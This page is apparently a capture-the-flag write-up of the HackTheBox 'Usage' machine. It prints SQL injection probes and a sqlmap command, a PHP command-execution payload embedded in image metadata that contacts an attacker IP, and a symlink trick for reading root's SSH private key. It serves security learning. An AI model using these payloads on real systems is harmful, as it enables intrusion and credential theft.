<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="../../css/Font.css">
        <link rel="stylesheet" href="css/code.css">
        <link rel="stylesheet" href="../../css/prism.css">
        <script src="../../js/prism.js"></script>
        <script src="js/copycode.js"></script>
        <script type="module"
            src="https://unpkg.com/@deckdeckgo/highlight-code@latest/dist/deckdeckgo-highlight-code/deckdeckgo-highlight-code.esm.js"></script>
    </head>
    <body>

        <pre>

            <img src="/public/images/Usage/Usage-1.png"/>

            <b>
                Port Scanning
            </b>


            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        rustscan -a 10.129.209.220
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        [~] Starting Script(s)
                        [~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-19 00:27 +07
                        Initiating Ping Scan at 00:27
                        Scanning 10.129.209.220 [2 ports]
                        Completed Ping Scan at 00:27, 0.03s elapsed (1 total hosts)
                        Initiating Parallel DNS resolution of 1 host. at 00:27
                        Completed Parallel DNS resolution of 1 host. at 00:27, 0.03s elapsed
                        DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
                        Initiating Connect Scan at 00:27
                        Scanning 10.129.209.220 [2 ports]
                        Discovered open port 80/tcp on 10.129.209.220
                        Discovered open port 22/tcp on 10.129.209.220
                        Completed Connect Scan at 00:27, 0.03s elapsed (2 total ports)
                        Nmap scan report for 10.129.209.220
                        Host is up, received conn-refused (0.030s latency).
                        Scanned at 2024-04-19 00:27:35 +07 for 0s

                        PORT   STATE SERVICE REASON
                        22/tcp open  ssh     syn-ack
                        80/tcp open  http    syn-ack
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <b>
                Web Service
            </b>

            <img src="/public/images/Usage/Usage-2.png"/>

            Every time I play web application security, I use Wappalyzer to identify the
            web application framework or programming language being used to create a challenge.

            <img src="/public/images/Usage/Usage-3.png"/>

            After I identify the web application framework. 
            I discovered something interesting on HackTricks.

            <b>
                User Flag
            </b>

            I removed some of the vulnerabilities I had selected, such as the Debugging
            mode and Deserialization RCE, because I don’t think they have a method for
            doing so. SQL Injection is my only option, but where is it?

            I spent a whole day trying to find SQL Injection, and at last, I was able to
            locate it on Reset Password. Here is my payload for testing it.

            
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        ' ORDER BY 8;-- -
                        ' ORDER BY 9;-- -
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            I can proof that this service can have been injected because when I
            attempted to increase the number, I received an error page. Let’s use SQL
            Map to exploit it!!!

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        sqlmap -r request -p email --batch --level 5 --risk 3 --dbms=mysql --dbs
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="/public/images/Usage/Usage-4.png"/>

            I don’t provide an additional payload because I believe you can do it by
            yourself and know what has to be done as the following step.

            After using a password cracking tool to get a password, I use the credentials I
            received to log in as admin.

            <img src="/public/images/Usage/Usage-5.png"/>

            I’m sure everyone sees it. The dashboard provides details about the version of dependencies.

            After researching into every dependencies vulnerability, I discovered
            something interesting in encore/laravel-admin: we can ACE

            I will upload the payload that shows me, I can reverse shell.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        exiftool -Comment="<?php system(\"ping -c 3 10.10.14.28\");?>" payload.jpg

                        sudo tcpdump -i {interface} icmp
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="/public/images/Usage/Usage-6.png"/>

            <img src="/public/images/Usage/Usage-7.png"/>

            Edit file name to make the file upload 2 extension and waiting to see result 
            of payload, Yummy I can run command!!!

            <img src="/public/images/Usage/Usage-8.png"/>

            Next step make reverse shell by yourself and you will get user flag

            <img src="/public/images/Usage/Usage-9.png"/>

            <b>
                Lateral movement
            </b>

            I looking for how to privilege escalation but I didn’t find anything so I try to
            list all user on system

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        cat /etc/passwd | grep /home
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="/public/images/Usage/Usage-10.png"/>

            I know I need to find Xander’s credentials, but how can I do that? and after
            that, I found a file that provided Xander’s credentials. (I just type ls -al)

            <img src="/public/images/Usage/Usage-11.png"/>

            <b>
                Privilege Escalation
            </b>

            If you’ve played HackTheBox before, it’s simple because the first command
            we execute when we obtain a user’s password is to verify sudo privilege.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        sudo -l
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="/public/images/Usage/Usage-12.png"/>

            Because this is custom software, so is no way for you to attack it using
            GTFOBins. However, we can use the strings command to read binary files.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        strings /usr/bin/usage_management
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="/public/images/Usage/Usage-13.png"/>

            I’ve discovered a way to get an answer. The technique is known as Wildcards
            Spare. (I found about it from HackTricks.)

            Let’s hacking following the steps that receive from HackTricks

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        cd /var/www/html
                        touch @id_rsa
                        ln -s /root/.ssh/id_rsa id_rsa
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="/public/images/Usage/Usage-14.png"/>

            You can get the flag in lots of ways. Since it’s really cool to take a screenshot
            and enter it in as the root user so I read the SSH key to login to the system

            <img src="/public/images/Usage/Usage-15.png"/>

        </pre>
    </body>